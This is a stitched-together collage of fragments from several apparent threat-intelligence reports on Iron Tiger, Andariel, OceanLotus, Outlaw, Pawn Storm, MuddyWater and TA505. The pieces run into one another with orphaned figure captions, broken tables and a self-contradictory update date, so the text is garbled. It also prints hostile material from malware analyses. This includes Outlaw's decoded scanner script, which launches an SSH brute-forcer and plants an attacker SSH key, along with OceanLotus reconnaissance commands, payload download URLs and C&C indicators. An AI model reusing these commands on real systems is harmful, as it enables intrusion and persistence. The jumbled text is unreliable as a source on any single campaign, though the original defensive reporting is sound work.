"We found three new samples of the Type 1 malware family that abuses Dropbox as a secondary C&C channel, which we described in our Operation DRBControl whitepaper."
This shows that the development is still active.
"We believe that this was a direct reaction to our research, suggesting that the threat actor read our investigation."
"This shows that the threat actors intended to confuse forensics investigators with incorrect timestamps, which is why it’s critical to analyze timestamps with caution during investigations."
Infection Vector
We could not confirm the primary infection vector.
"However, traces of the exploitation of the Microsoft Exchange vulnerability CVE-2020-0688 were found."
Multiple infection vectors have been attributed to this threat actor in the past: Watering holes
"Weaponized documents exploiting the Dynamic Data Exchange (DDE) method Weaponized documents exploiting the CVE-2018-0798 vulnerability in Equation Editor Exploitation of the CVE-2019-0604 vulnerability in Sharepoint Supply chain attack that compromises a chat software installer, Able Desktop Exploitation of recent vulnerabilities (CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065) in Microsoft Exchange Server"
"During our investigation, we found some old samples that fit in these categories but have not been reported."
Targets
The closer look into Iron Tiger was prompted because of an incident response investigation involving a Philippine-based gambling company that the group targeted.
Figure 3.
The countries that Iron Tiger has targeted in the past 18 months Timeline
"New sample of Type 1 malware variant and a rootkit called Pandora found April 2020: One rootkit sample for hiding files processes, files, and services found October 2020:"
New HyperBro and Pandora samples found December 2020:
One sample of the SysUpdate malware variant found January 2021:
Fast Reverse Proxy (FRP) Linux tool found Conclusion
"We detailed how Iron Tiger threat actors have updated their tools, adding new features, and slightly changing their tactics, techniques, and procedures (TTPs), notably by using a rootkit to hide its backdoors."
We expect to see more cases involving four or five files instead of the usual “trident” in the future.
"Updated June 18, 2018, 10:05 AM to add new IoC information from IssueMakersLab's July investigation."
We updated it again at 4:30 PM to add a link to IssueMakersLab's website and to add new IoC information.
This research is done in cooperation with IssueMakersLab of South Korea.
"Last month we tracked new scouting techniques coming from Andariel, which were used mainly against South Korean targets."
Andariel has been quite active these past few months.
"But more recently on June 21, we noticed that Andariel injected their script into four other compromised South Korean websites for reconnaissance purposes."
"This was possibly part of their reconnaissance strategy, to find the right targets for their exploit."
"To help prevent any damage, we decided to publish our findings before the group deploys the attack."
Figure 1. Watering hole reconnaissance flow Analysis of the Andariel techniques
"On June 21, we found that the website of a Korean non-profit organization was compromised with an injected script that collected visitors’ information."
This reconnaissance lasted until 27 June.
We already notified the websites about the compromise.
IssueMakersLab also listed the ActiveX objects that the Andariel group attacked.
"Another is “WSACTIVEBRIDGEAX.WSActiveBridgeAXCtrl.1”, which is related to a South Korea-based voice conversion software company."
Parameter Meaning Parameter Meaning w Website name w Website name r <?=$referer?> value r <?=$referer?> value o OS version o OS version lv HTTP Accept-Language lv HTTP Accept-Language bt Browser Information bt Browser Information bv Browser Information bv Browser Information bdv Browser Information bdv Browser Information fv Flash Version fv Flash Version silv Silverlight Version silv Silverlight Version ez EasyPayPlugin ActiveX Availability ez EasyPayPlugin ActiveX Availability ac ACUBEFILECTRL ActiveX Availability* - - - - mg MagicLoaderX ActiveX Availability - - nv
NVersionMan ActiveX Availability si SIClientAccess ActiveX Availability si SIClientAccess ActiveX Availability du DUZONERPSSO ActiveX Availability du DUZONERPSSO ActiveX Availability iw INIWALLET61 ActiveX Availability - - - - ad admctrl ActiveX Availability
"Besides the ActiveX objects, we noticed that the script added new code to connect websocket to localhost."
"This shows that the attacker has expanded his target base, and is interested in the software itself and not just their ActiveX objects."
Indicators of Compromise (IoC) IoCs Description cfcd391eec9fca663afd9a4a152e62af665e8f695a16537e061e924a3b63c3b9
Injected Script in May 2018 e0e30eb5e5ff1e71548c4405d04ce16b94c4cb7f8c2ed9bd75933cea53533114 Injected Script in June 2018 67a1312768c4ca3379181c0fcc1143460efcb4bff7a4774c9c775043964c0878
Injected Script in 17 July 2018 hxxp://aega[.]co[.]kr/mall/skin/skin.php
Compromised site (received information May 2018) hxxp://www[.]peaceind[.]co[.]kr/board/icon/image.php
Compromised site (received information May 2018) hxxp://alphap1[.]com/hdd/images/image.php Compromised site (received information May 2018) hxxp://adfamc[.]com/editor/sorak/image.php Compromised site (received information June 2018) hxxp://adfamc[.[com/editor/sorak/skin.php Compromised site (received information 17 July 2018)
"Like previous websites we’ve seen set up by this actor, this website has a link to their PGP public key at the bottom of the page."
We encourage anyone who discovers a Chrome vulnerability to report that activity through the Chrome Vulnerabilities Rewards Program submission process.
"Their blog contains write-ups and analysis of vulnerabilities that have been publicly disclosed, including “guest” posts from unwitting legitimate security researchers, likely in an attempt to build additional credibility with other security researchers."
"In the video, they purported to show a successful working exploit that spawns a cmd.exe shell, but a careful review of the video shows the exploit is fake."
"Within the Visual Studio Project would be source code for exploiting the vulnerability, as well as an additional DLL that would be executed through Visual Studio Build Events."
The DLL is custom malware that would immediately begin communicating with actor-controlled C2 domains.
"In addition to targeting users via social engineering, we have also observed several cases where researchers have been compromised after visiting the actors’ blog."
We encourage anyone who discovers a Chrome vulnerability to report that activity via the Chrome VRP submission process.
"If you have communicated with any of these accounts or visited the actors’ blog, we suggest you review your systems for the IOCs provided below."
Host IOCs Registry Keys HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\KernelConfig HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverConfig HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SSL Update File Paths C:\Windows\System32\Nwsapagent.sys C:\Windows\System32\helpsvc.sys C:\ProgramData\USOShared\uso.bin C:\ProgramData\VMware\vmnat-update.bin C:\ProgramData\VirtualBox\update.bin
We recently discovered a new backdoor we believe to be related to the OceanLotus group.
Figures 1-2.
Recently they have also been discovered by researchers from Volexity to be using malicious websites to propagate malware.
Arrival
"It uses the icon for a Word document file as a disguise, attempting to pass itself off as a legitimate document file."
Figure 3.
"The 3 bytes ""efb880"" is in UTF-8 encoding."
"According to UTF-8 mapping, the related Unicode code is ""U+FE00""."
UTF-8
mapping
"""U+FE00"" is a special Unicode control character with name variation selector-1, which provides the visual appearance of a CJK compatibility ideograph."
"Otherwise, if the postfix is .doc without special characters, Microsoft Word is called to open the app bundle as a document; but since it is not a valid document, the app fails to open it."
Here is the code signing information for the app bundle sample.
Figure 5. Code signing information for the sample
Plist file ~/Library/LaunchAgents/com.apple.marcoagent.voiceinstallerd.plist
The timestamp of the dropped files 4) Delete itself
Third-stage payload
Figure 10. Encrypted strings Figures 11-12.
"Decryption routine Like older versions of the OceanLotus backdoor, the new version contains two main functions: one for collecting operating system information and submitting this to its malicious C&C servers and receiving additional C&C communication information, and another for the backdoor capabilities."
"It collects the following information from the infected system by invoking the following commands: Command Description system_profiler SPHardwareDataType 2>/dev/null | awk '/Processor / {split($0,line,\"":\""); printf(\""%s\"",line[2]);}' Get processor information 15f20 = system_profiler SPHardwareDataType 2>/dev/null | awk '/Memory/ {split($0,line, \"":\""); printf(\""%s\"", line[2]);}'"
"Get memory information ioreg -rd1 -c IOPlatformExpertDevice | awk '/IOPlatformSerialNumber/ { split($0, line, \""\\\""\""); printf(\""%s\"", line[4]); }"
Get serial number ifconfig -l ifconfig <device> | awk '/ether /{print $2}' 2>&1 Get network interface MAC addresses Table 2.
OceanLotus commands and descriptions
TCP stream excerpt of the malware sending information to C&C server
TCP stream excerpt of the malware receiving commands from C&C server
Figures 17-18.
Figure 19. URLs related to mihannevis[.]com as seen on VirusTotal
"The domain ""mykessef[.]com"" was used for the C&C server earlier."
Figure 20.
Domain history of mykessef[.]com based on Whois Lookup
Figure 21.
"idtpl[.]org registration information based on Whois Lookup But from the middle of July 2020, its IP address changed to 185[.]117[.]88[.]91. Figure 22. Domain History of idtpl[.]org as seen on VirusTotal"
Recommendations
Threat groups such as OceanLotus are actively updating malware variants in attempts to evade detection and improve persistence.
Indicators of Compromise SHA-256 Filename/Description Trend Micro Pattern Detection cfa3d506361920f9e1db9d8324dfbb3a9c79723e702d70c3dc8f51825c171420 ALL%20tim%20nha%20Chi%20Ngoc%20Canada.zip Backdoor.MacOS.OCEANLOTUS.F 48e3609f543ea4a8de0c9375fa665ceb6d2dfc0085ee90fa22ffaced0c770c4f ALL tim
nha
Chi Ngoc Canada Backdoor.SH.OCEANLOTUS.F 05e5ba08be06f2d0e2da294de4c559ca33c4c28534919e5f2f6fc51aed4956e3 2nd stage fat binary Backdoor.MacOS.OCEANLOTUS.F fd7e51e3f3240b550f0405a67e98a97d86747a8a07218e8150d2c2946141f737 3rd stage fat binary Backdoor.MacOS.OCEANLOTUS.F Domains mihannevis[.]com mykessef[.]com idtpl[.]org MITRE TTP Tactic ID Name
Description Defense Evasion
T1070.004 File Deletion The app bundle and dropper delete themselves after execution T1222.002 Linux and Mac File and Directory Permissions Modification
The backdoor changes the permission of the file it wants to execute to +x T1027 Obfuscated Files or Information Readable strings were encrypted T1036.005 Masquerading: Match Legitimate Name or Location The app bundle is disguised as a doc file to trick users into executing it T1070.006 Indicator Removal
on Host
Timestomp The backdoor modifies the date and time of the dropped files using the “touch” command Discovery T1082 System Information Discovery The backdoor collects various information to send to the C&C server Collection T1560.003 Archive Collected Data: Archive via Custom Method The backdoor encrypts the data before exfiltration Command and Control T1095 Non-Application Layer Protocol
"As we’ve observed with cybercriminal groups that aim to maximize profits for every campaign, silence doesn’t necessarily mean inactivity."
"It appears hacking group Outlaw, which has been silent for the past few months, was simply developing their toolkit for illicit income sources."
"While they have been quiet since our June analysis, we observed an increase in the group’s activities in December, with updates on the kits’ capabilities reminiscent of their previous attacks."
Routine
"The honeynet graphs, which show activity peaks associated with specific actions, also suggest that the scans were timed."
The attackers could hide their activities if they noted the business hours of the intended targets and performed the actions coinciding with said times.
Figure 1.
Anomalous properties of a command detected from traffic
They attempted to evade traffic inspection by encoding the code for the scanner with base-64.
Decoding the scanner revealed the following codes: #!/bin/bash cd /tmp rm -rf .ssh rm -rf .mountfs rm -rf .X13-unix rm -rf .X17-unix rm -rf .X19-unix mkdir .X19-unix cd .X19-unix mv /var/tmp/dota3.tar.gz dota3.tar.gz tar xf dota3.tar.gz sleep 3s && cd /tmp/.X19-unix/.rsync/c nohup /tmp/.X19-unix/.rsync/c/tsm -t 150 -S 6 -s 6 -p 22 -P 0 -f 0 -k 1 -l 1 -i 0 /tmp/up.txt 192.168 >> /dev/null 2>1& sleep 8m && nohup /tmp/.X19-unix/.rsync/c/tsm -t 150 -S 6 -s 6 -p 22 -P 0 -f 0 -k 1 -l 1 -i 0
/tmp
/up.txt 172.16
> /dev/null 2>1& sleep 20m && cd ..; /tmp/.X19-unix/.rsync/initall 2>1& exit 0
"The kit we found is in tgz format, though we have observed some samples disguised as png or jpg."
"The tsm binary then runs in the background, forwarding a series of error messages to /dev/null to keep the code running, ensuring the continuous execution of the code referenced with a set of parameters /tmp/up.txt."
The script then waits 20 minutes before it runs the wrapper script initall: 2e2c9d08c7c955f6ce5e27e70b0ec78a888c276d71a72daa0ef9e3e40f019a1a initall Figure 2.
Running the initall wrapper script
Another variant executes a set of commands once a system is successfully compromised.
head -n 1 cat /proc/cpuinfo | grep name |
"head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
"echo ""root 123"" > /tmp/up.txt rm -rf /var/tmp/dota* <send Outlaw kit (the archive file) to compromised host via SFTP> cat /var/tmp/.systemcache436621 echo ""1"" > /var/tmp/.systemcache436621 cat /var/tmp/.systemcache436621 sleep 15s && cd /var/tmp; echo ""IyEvYmluL2Jhc2gKY2QgL3RtcAk.....<shortened> cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3N.....<shortened>"
"Based on a bashtemp directory of the latest sample we found, there are other compiled ELF scripts, named init and init2, that loops the kit to keep running: 0c458dfe0a2a01ab300c857fdc3373b75fbb8ccfa23d16eff0d6ab888a1a28f6 init Figure 3. Running the init ELF script 93ce211a71867017723cd78969aa4cac9d21c3d8f72c96ee3e1b2712c0eea494 init2 Figure 4."
We also found the init0 script running; the script cleans out all miners regardless of its origin.
Figure 5.
"The init0 script running It then resets cron and removes possible cache files from other programs, starts scripts and binaries a, init0, and start, and sets the persistence by modifying the crontab."
This allows the malicious activity to evade detection.
Figure 6. Current variables for rsync (the Shellbot) Figure 7. Connects to C&C to send current control variables
Trend Micro solutions
Indicators of Compromise (IoCs) SHA256 Description Detection Name 1800de5f0fb7c5ef3c0d9787260ed61bc324d861bc92d9673d4737d1421972aa Cryptocurrency miner Trojan.SH.MALXMR.UWEJP b68bd3a54622792200b931ee5eebf860acf8b24f4b338b5080193573a81c747d Shellbot Backdoor.SH.SHELLBOT.AA 620635aa9685249c87ead1bb0ad25b096714a0073cfd38a615c5eb63c3761976 Tool Trojan.Linux.SSHBRUTE.B fc57bd66c27066104cd6f8962cd463a5dfc05fa59b76b6958cddd3542dfe6a9a Cryptocurrency miner Coinminer.Linux.MALXMR.SMDSL32 649280bd4c5168009c1cff30e5e1628bcf300122b49d339e3ea3f3b6ff8f9a79 Cryptocurrency miner Coinminer.Linux.MALXMR.SMDSL64 URLs 159[.]203[.]141[.]208 104[.]236[.]192[.]6 45[.]9[.]148[.]129:80 Miner pool 45[.]9[.]148[.]125:80 Miner pool http://www[.]minpop[.]com/sk12pack/idents.php Command and control http://www[.]minpop[.]com/sk12pack/names.php Command and control MITRE ATT&CK Matrix Tags Malware | APT & Targeted Attacks | Endpoints | IoT | Research | Network
"However, they are particularly known for dangerous credential phishing campaigns."
"In 2016, the group set up aggressive credential phishing attacks against the Democratic National Convention (DNC), German political party Christian Democratic Union (CDU), the parliament and government of Turkey, the parliament of Montenegro, the World Anti-Doping Agency (WADA), Al Jazeera, and many other organizations."
High profile users of free webmail were targeted by campaigns between 2015 and 2016.
How is OAuth abused?
"Because of these policies, experienced actor groups like Pawn Storm can take advantage of OAuth for their credential phishing schemes."
Figure 1. The sequence of Pawn Storm's OAuth abuse A dissection of Pawn Storm OAuth attacks
In these attacks a user would get a message like this:
Figure 2. A phony email from Pawn Storm
"At this point, the user is faced with a legitimate Google site—since all OAuth approvals are done on the site of the service provider—but the application itself is part of a phishing scheme."
"After abusing the screening process for OAuth approvals, Pawn Storm’s rogue application operates like every other app accepted by the service provider."
"Apart from targeting Gmail users, Pawn Storm has also abused OAuth in credential phishing attacks against high profile Yahoo users."
Here is an example from 2015 where “McAfee Email Protection” is offered.
Figure 4.
A convincing Yahoo phishing email Clicking on the “Try McAfee Email Protection” button would lead to this legitimate website:
Figure 5.
This gives the third party app OAuth access
"However the application is not a service of Yahoo or a legitimate product of McAfee, but a rogue application used by Pawn Storm."
Figure 6.
Overview of Pawn Storm’s Yahoo credential phishing campaigns.
The blue boxes indicate when Pawn Storm used OAuth lures while red boxes indicate other phishing email strategies OAuth enhances the user experience on the web.
"These are known rogue applications of Pawn Storm that have been used in credential phishing attacks against high profile users (variants of these names are likely to have been used by Pawn Storm as well): Google Defender Google Email Protection Google Scanner Delivery Service (Yahoo) McAfee Email protection (Yahoo) For more information about Pawn Storm, check out From Espionage to Cyber Propaganda: Pawn Storm's Activities over the Past Two Years."
"We discovered a new campaign targeting organizations in Turkey, Pakistan and Tajikistan that has some similarities with an earlier campaign named MuddyWater, which hit various industries in several countries, primarily in the Middle East and Central Asia."
"Comparing the earlier MuddyWater campaign with this new one reveals some distinct similiarities: 2017 MuddyWater Campaign 2018 “MuddyWater” Campaign Countries of Targeted Organizations Georgia, India, Iraq, Israel, Pakistan, Saudi Arabia Turkey United Arab Emirates, and the USA Turkey, Pakistan, Tajikistan"
Some documents also come with government emblems.
Dropped Files Visual Basic file and Powershell file; the VBS file executes the PS file
Infection Chain Figure 1.
Infection chain for the attack
used
Another example of a header allegedly from the Ministry of Internal Affairs of Tajikistan
"After enabling the macros and the payload executes, two files – an obfuscated Visual Basic script (Detected by Trend Micro as VBS_VALYRIA.DOCT), and an obfuscated PowerShell script (Detected by Trend Mico as TROJ_VALYRIA.PS) — are created in the ProgramData directory placed in randomly-named directories."
The purpose of the .VBS script is to execute the PowerShell script.
The path to the VBS script is added to the task scheduler as a form of persistence.
Figure 5.
"The PowerShell script, which employs several layers of obfuscation, is divided into three parts."
The configuration portion of the PowerShell script
"The second part contains functions related to the encryption, which is a standard RSA encryption with very small keys."
The third part contains the backdoor function.
"The backdoor first finds out the machine IP address by querying the internet service api[.]ipify[.]org, which returns the IP address of the currently infected machine."
A simple RSA algorithm with very small keys encrypts the message seen above.
Let’s take the first character as an example.
Character “{” = 0x7B =123.
"Variable ${prIVATE} = 959, 713 from section 1 of the PowerShell script has two values; the first number is the key and the second number is the modulus."
By computing (123 ^ 959) mod 713 = 340 we get the encrypted value of the first character (see number 340 in the figure below).
Figure 9.
Figure 10.
"The message above can be decrypted to: {""STATUS"": ""OK"", ""TOKEN"": ""d02153ffaf8137b1fa3bb852a27a12f8""}"
Figure 11.
The XML message with the screenshot
Figure 12.
"For the PowerShell script, the first part contains a variable named dragon_middle, which is an array containing a few hundred URLs ending with connection.php that serve as proxies between victim and C&C."
"If communication with C&C fails, and if the PowerShell script is run from a command line, a few error messages written in simplified Mandarin Chinese are displayed, with a curious phrase that translates to ""waiting for dragon"": 无法访问本地计算机寄存器 (Unable to access local computer register) 任务计划程序访问被拒绝 (Mission Scheduler access is denied) 无法连接到网址，请等待龙 (Cannot connect to URL, please wait for dragon) 无法连接到网址，请等待龙 (Cannot connect to website, please wait for dragon) These messages may not reveal anything about the real attackers as the malware writers sometimes like to embed false flags into their programs to confuse researchers."
Countermeasures and Trend Micro Solutions Users unfamiliar with the various kinds of social engineering techniques might find it difficult to distinguish a legitimate message from a malicious one – thus the need for education on identifying and mitigating phishing attacks – especially if it involves organizations in sensitive industries such as government and manufacturing.
"Trend Micro™ Email Security is a no-maintenance cloud solution that delivers continuously updated protection to stop spam, malware, spear phishing, ransomware, and advanced targeted attacks before they reach the network. Trend Micro™ Deep Discovery™ Inspector and InterScan™ Web Security prevent malware from ever reaching end users."
"It features high-fidelity machine learning to secure the gateway and endpoint data and applications, and protects physical, virtual, and cloud workloads. Indicators of Compromise (IOCs) Hashes detected as W2KM_VALYRIA.DOCT: 009cc0f34f60467552ef79c3892c501043c972be55fe936efb30584975d45ec0 153117aa54492ca955b540ac0a8c21c1be98e9f7dd8636a36d73581ec1ddcf58 18479a93fc2d5acd7d71d596f27a5834b2b236b44219bb08f6ca06cf760b74f6 18cf5795c2208d330bd297c18445a9e25238dd7f28a1a6ef55e2a9239f5748cd 1ee9649a2f9b2c8e0df318519e2f8b4641fd790a118445d7a0c0b3c02b1ba942 2727bf97d7e2a5e7e5e41ccbfd7237c59023d70914834400da1d762d96424fde 2cea0b740f338c513a6390e7951ff3371f44c7c928abf14675b49358a03a5d13 3b1d8dcbc8072b1ec10f5300c3ea9bb20db71bd8fa443d97332790b74584a115 3d96811de7419a8c090a671d001a85f2b1875243e5b38e6f927d9877d0ff9b0c 3da24cd3af9a383b731ce178b03c68a813ab30f4c7c8dfbc823a32816b9406fb 6edc067fc2301d7a972a654b3a07398d9c8cbe7bb38d1165b80ba4a13805e5ac 76e9988dad0278998861717c774227bf94112db548946ef617bfaa262cb5e338 9038ba1b7991ff38b802f28c0e006d12d466a8e374d2f2a83a039aabcbe76f5c 93745a6605a77f149471b41bd9027390c91373558f62058a7333eb72a26faf84 a70aca719b06fc8ef0cd0b0e010c7bc8dc6d632e4f2f874e4c0e553bd8db2df2 aa60c1fae6a0ef3b9863f710e46f0a7407cf0feffa240b9a4661a4e8884ac627 af5f102f0597db9f5e98068724e31d68b8f7c23baeea536790c50db587421102 cee801b7a901eb69cd166325ed3770daffcd9edd8113a961a94c8b9ddf318c88 d07d4e71927cab4f251bcc216f560674c5fb783add9c9f956d3fc457153be025 dfbd67177af9d35188fc9ff9363c2b9017e9ccfe6719e3d641a56fb5dc0d47f7 eff78c23790ee834f773569b52cddb01dc3c4dd9660f5a476af044ef6fe73894 fbbda9d8d9bcaaf9a7af84d08af3f5140f5f75778461e48253dc761cc9dc027c Hash detected as VBS_VALYRIA.DOCT: 0A9FC303CA03F4D9988A366CBBD96C24857E87374568EC5A4AAA4E55FE2C3C7E 0BC10D5396B3D8ECC54D806C59177B74E167D9F39D8F1B836806127AF36A7C4E 0BC10D5396B3D8ECC54D806C59177B74E167D9F39D8F1B836806127AF36A7C4E 25186621282D1E1BAD649B053BDB7B56E48B38189F80DB5A69B92301EF9ED613 25186621282D1E1BAD649B053BDB7B56E48B38189F80DB5A69B92301EF9ED613 3607432758176a2c41a1971b3c4d14a992a68b231851f8b81c6e816ea9ea29b2 59F9E0FAA73E93537AE4BD3A8695874BA25B66CEFA017537132914C770D0CF70 59F9E0FAA73E93537AE4BD3A8695874BA25B66CEFA017537132914C770D0CF70 59F9E0FAA73E93537AE4BD3A8695874BA25B66CEFA017537132914C770D0CF70 6228d79f56c574ceada16453404c54dd95641aa78d3faed6874daf485116793b 66af894eee6daae66bf0bcb87cb7abe2a0ebb6a59779f652db571e7ee298d751 92C7FEAD5EE0F0ECD35FE247DBE85648AADA4B96F1E960B527B4929E42D47B01 c006911be5480f09e0d8560c167561f68681607ca8f7e3c4f5d476dc6673594f F05C18C1D4428349137A9DF60CDEBE8A0F9E6DA47B359DC0616FF8D47E46704E Hash detected as TROJ_VALYRIA.PS: 0065d592d739ac1dd04d0335151c8855c7fafbf03e86134510ac2fc6766e8d60 0073ce0f4c82fc4d0470868e124aab9ad08852e1712564136186e5019fca0da0 02F58256FF52ED1CDB21064A28D6E5320005F02EF16E8B2FE851438BBC62A102 02F58256FF52ED1CDB21064A28D6E5320005F02EF16E8B2FE851438BBC62A102 04d61b1d2c3187280b3c4e93d064a051e9ee0f515f74c6c1c44ba577a7a1c804 04d61b1d2c3187280b3c4e93d064a051e9ee0f515f74c6c1c44ba577a7a1c804 0A9FC303CA03F4D9988A366CBBD96C24857E87374568EC5A4AAA4E55FE2C3C7E 0A9FC303CA03F4D9988A366CBBD96C24857E87374568EC5A4AAA4E55FE2C3C7E 4DD5C3CE5ED2145D5AFA8DD476A83DFC693E5FC7216C1EABB3FA0EB6B5F8590D 4DD5C3CE5ED2145D5AFA8DD476A83DFC693E5FC7216C1EABB3FA0EB6B5F8590D 55ae821cf112ff8d6185ce021f777f73d85150c62a835bb1c02fe9e7b3f863bf 61d846708f50024e1c65237eb7158beac9b9c5840853b03ef7c73fe5293a9a8d 624762a90b7272e247e5022576b7912d1aa0b32bc13aabc7ee47197e5b87a41b 6421C22D854C199B761436C87CAE1EAFFBA8783A3A40C00D4A0982D7C242EA79 92C7FEAD5EE0F0ECD35FE247DBE85648AADA4B96F1E960B527B4929E42D47B01 a53f832edc18de51e0ffaf67047072a6bbd5237defa74f5bf35dfc0df2aeca1b C1780F3AD76AF703CEDDD932B187CF919866A00BB3E2D6F0827B9DAE9D8875B6 C1780F3AD76AF703CEDDD932B187CF919866A00BB3E2D6F0827B9DAE9D8875B6 C9D782FFAA98791613FEF828E558B296932FA245192BD0EBA8F76536860DB84E C9D782FFAA98791613FEF828E558B296932FA245192BD0EBA8F76536860DB84E CCA8E84901C4184BE2849D29C39294FD4B6940F9A6668FDCFF9728CD319FFF96 CCA8E84901C4184BE2849D29C39294FD4B6940F9A6668FDCFF9728CD319FFF96 cca8e84901c4184be2849d29c39294fd4b6940f9a6668fdcff9728cd319fff96 e57dbce8130e281a73727122d33cbff170a54237cd0016d79b30ace18c94e7d4 Hash detected as JS_VALYRIA.DOCT: 070EBCAC92FB7619F957BF3F362099574158E5D2D0BC0CF9206A31BA55EDD48F Scriptlets and inf files related to applocker bypass: 2791fdc54ee037589f951c718935397e43d5f3d5f8e078e8b1e81165a3aebbaf 288afbe21d69e79a1cff44e2db7f491af10381bcc54436a8f900bcbd2a752a6f 5e173fbdcd672dade12a87eff0baf79ec4e80533e2b5f6cf1fac19ad847acba0 Tags Network | APT & Targeted Attacks | Research"
"In the group's latest campaign, they started using HTML attachments to deliver malicious .XLS files that lead to downloader and backdoor FlawedAmmyy, mostly to target users in South Korea."
Figure 1. TA505’s latest infection chain
"We also touch on the latest TA505 developments, including an email stealer, their use of legitimate software and MSI Installer, and more."
"As previously mentioned, TA505, first named by Proofpoint, is known for targeting financial enterprises."
"Since last December, TA505 has been very active and has been using legitimate or compromised RATs (remote access trojans) such as FlawedAmmyy, FlawedGrace, and Remote Manipulator System (RMS)."
"Figure 2. Korean language (left), simplified Chinese language (right) Microsoft Office instructions on how to enable macro Figure 3."
"This said macro executes a command to download the first stage payload using msiexec.exe, a Microsoft Installer tool that can download and run a Windows Installer file."
The first stage payload is an MSI Installer that was created using an EXE to MSI converter.
Figure 4. MSI Installer payload that used EXE to MSI converter
The actual malicious payload is in the MSI Installer package.
"The payload can vary in each campaign, but it typically uses the FlawedAmmyy downloader, ServHelper, or RMS RAT launcher."
Payload as FlawedAmmyy downloader
"The MSI Installer itself contains a FlawedAmmyy downloader, which is always signed."
Figure 5. FlawedAmmyy downloader Figure 6.
Digitally signed FlawedAmmyy downloader
It then runs the “net group /domain” command and checks if “workgroup” is contained in the output result.
"After performing the check, it downloads the RC4-encrypted FlawedAmmyy RAT, decrypts it, and executes it as the final payload."
"We recently observed an instance where the FlawedAmmyy downloader was not digitally signed (FlawedAmmyy RAT payload is still signed, however)."
"If the MSI Installer package contains ServHelper as a payload, it will come with an NSIS (Nullsoft Scriptable Install System) installer."
Figure 7.
"NSIS Installer NSIS is a legitimate tool that manages the installation for Windows, but some hacking groups also abuse it."
"TA505, for instance, abuses NSIS to install ServHelper."
This NSIS installer has two files: (nsExec.dll and repotaj.dll) and [NSIS].nsi.
The latter is a configuration file that handles files to install.
Figure 8.
NSIS Installer sections
"In this case, repotaj.dll, which is ServHelper, will be extracted to %TEMP% and execute with the “feast” parameter as its export function."
"Once ServHelper is executed, it runs a PowerShell script to get information from the infected machine."
"Payload as RMS RAT TA505 also uses RMS, a legitimate RAT, in their campaigns."
Figure 9.
SFXRAR
Three files extracted from SFXRAR Figure 11.
"Executed parameters As indicated in the parameter above, kernel.dll/uninstall.exe is also SFXRAR, but password-protected."
"It will extract the following files (Figure 12) and execute exit.exe, where the said executable is also a launcher of i.cmd that registers winserv.exe (the actual RMS RAT) and executes it."
Figure 12.
Extracted files Figure 13.
"RMS RAT is added to the startup registry and executed Updates on TA505's tactics, techniques and procedures"
"Using Amadey to distribute EmailStealer On April 24, we detected an attack that used Amadey as its first stage payload."
Avoiding the use of msiexec.exe
"As previously mentioned, TA505 abuses msiexec.exe to install its first stage payload, but we recently observed the group just directly downloading the first stage payload binary and executing it."
"Like the VBA macro code, the group just executes the downloaded file 234.exe by cmd.exe."
"However, as mentioned earlier, the group has also started to attach an HTML link in emails to trick users into opening the Excel file."
Figure 15.
Attached HTML
Some recent cases we observed even had the Excel file directly attached to the emails.
Figure 16.
Thank you.)
Suspicious activity involving TA505
"While analyzing TA505's activities, we encountered strange attacks that were very similar to TA505’s TTPs but with some differences."
"But it also contains Kronos, a known banking trojan; and SmokeLoader, which is another payload downloader."
The TA505 group usually attaches a malicious file without any compression.
But this attack sent an email with a .rar or .zip attachment.
Figure 17.
"For one thing, it has a different style of VBA macro."
Figure 18. VBA macro with heavy obfuscation
Another factor is its different codepage.
Malicious Excel files that TA505 distributed had information harvesting capabilities.
"Lacking the use of fast flux infrastructure TA505 uses fast flux, a DNS technique used to mask botnets by quickly shifting among compromised hosts, which allows cybercriminals to delay or evade detection."
"Using Kronos and SmokeLoader (v2019) TA505 previously used Amadey to distribute the FlawedAmmyy downloader before, so the use of Kronos and SmokeLoader can’t be considered strong evidence of false attribution."
Using a different infrastructure to distribute spam
The strongest evidence that this attack might not come from TA505 is that this attack operator used a different spam infrastructure.
Our daily monitoring of TA505's activities show that the group sends spam from specific IPs; this suspicious attack used different sender IPs.
We couldn’t find any of the IPs used in previous attacks.
"We can’t say for sure if this particular attack comes from TA505, another threat actor, an imitator, or perhaps just TA505 using another infrastructure."
"This reiterates the tricky business of attribution in cybersecurity, which calls for careful inspection."
"While it's easy to attribute similar incidents to certain threat actors, groups, or even countries, attribution should ultimately be based on technically provable information."
"Trend Micro™ Hosted Email Security is a no-maintenance cloud solution that delivers continuously updated protection to stop spam, malware, spear phishing, ransomware, and advanced targeted attacks before they reach the network."
"Just like in previous operations, they continue to make small changes, such as targeting other countries, entities, or the combination of techniques used for deployment, for each campaign."
"Despite the changes, TA505 continues to use either FlawedAmmyy RAT (remote access trojan) or ServHelper as payloads."
"However, over the last nine campaigns since our June report, they also started using .ISO image attachments as the point of entry, as well as a .NET downloader, a new style for macro delivery, a newer version of ServHelper, and a .DLL variant of FlawedAmmyy downloader."
".ISO, enabled macros for entry dropping ServHelper or FlawedAmmyy"
Emails with an attached .ISO image is an .LNK file that uses command line msiexec to execute an MSI file from a URL such as hxxp://139[.]180[.]195[.]36/pm2.
Figure 1. Infection chains for ServHelper installation Figure 2.
"A sample of an .ISO file with an embedded .LNK file The pm2 file contains and runs another executable, which is an installer file created using Nullsoft Scriptable Install System (NSIS), a free script-driven installer authoring tool for Windows."
This NSIS-encapsulated file then installs ServHelper .
Figure 3.
.LNK shortcut in .ISO file
"The macros directly download the file created using NSIS installer from hxxp://45[.]67[.]229[.]36/p2, which is the same binary we found in the .ISO and .LNK files that install ServHelper."
Figure 4.
Figure 5.
Encrypted string We observed that some of the samples still had errors in the cipher routine.
"In another routine that was supposed to result in a stack overflow, it also displayed an error message."
Figure 6.
Vigenère cipher in ServHelper and the Delphi code in stack overflow
The encrypted sample — via XOR encoding/URL encoding — also received a response from the C&C encrypted with XOR.
Figure 7. XOR Encrypted C&C communication
"The newer version shows that the developers behind ServHelper continued to upgrade it to evade detection and add more functions, possibly for even more iterations in the future."
"In a campaign targeting thousands of Korean businesses, we found an .ISO attachment — used as the malicious downloader — disguised as a confirmed flight ticket from a popular airline. Figure 8. TA505 spoofing an airline company as a malicious file attachment."
"In a slightly different technique still targeting Korean enterprises, the .ISO files either contained an .LNK file such as the previous iteration, or a .NET-compiled downloader."
